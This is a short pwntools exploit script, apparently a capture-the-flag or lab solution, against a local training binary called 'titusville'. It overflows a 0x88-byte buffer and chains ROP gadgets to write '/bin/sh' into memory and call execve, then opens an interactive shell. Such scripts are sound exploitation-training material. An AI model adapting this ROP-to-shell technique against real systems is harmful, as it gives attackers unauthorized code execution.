from pwn import *

# Establish the target
HOST = "localhost"
PORT = 24607
target = remote(HOST, PORT)

elf = context.binary = ELF('../../.build/i95/i95-titusville/titusville')

#target = elf.debug(gdbscript='continue')
rop = ROP(elf)

# The Rop Gadgets
pop_rdi = p64(rop.rdi[0]) #p64(0x402066) # pop rdi ; ret
pop_rax = p64(rop.rax[0]) #p64(0x41925d) # pop rax ; ret
pop_rsi = p64(rop.rsi[0]) #p64(0x4056cb) # pop rsi ; ret
pop_rdx = p64(rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]) #p64(0x46073b) # pop rdx ; pop rbx ; ret
mov_ins = p64(0x48d54a) # mov qword ptr [rsi], rax ; ret
syscall = p64(rop.syscall[0]) #p64(rop.syscall[0]) #p64(0x40131b) # syscall

info(hex(u64(pop_rsi)))

# Make the payload
payload = b"0"*0x88 + \
pop_rsi + p64(0x4c8050) + pop_rdx + b"/bin/sh\x00" + b'A' * 8 + mov_ins + \
pop_rax + p64(0x3b) + \
pop_rdi + p64(0x4c8050) + \
pop_rsi + p64(0x00) + \
pop_rdx + p64(0x00) + p64(0x00) + \
syscall

# Send the payload
target.sendline(payload)

# Drop to an interactive shell
target.interactive()

